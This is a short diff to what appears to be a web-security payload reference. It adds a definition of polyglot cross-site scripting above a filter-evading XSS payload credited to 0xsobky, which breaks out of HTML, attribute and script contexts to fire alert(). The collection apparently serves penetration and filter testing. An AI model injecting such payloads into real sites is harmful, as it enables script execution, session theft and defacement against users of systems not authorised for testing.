@@ -1,5 +1,7 @@
 # Polyglot XSS
 
+A polyglot XSS is a type of cross-site scripting (XSS) payload designed to work across multiple contexts within a web application, such as HTML, JavaScript, and attributes. It exploits the application’s inability to properly sanitize input in different parsing scenarios.
+
 * Polyglot XSS - 0xsobky
     ```javascript
     jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
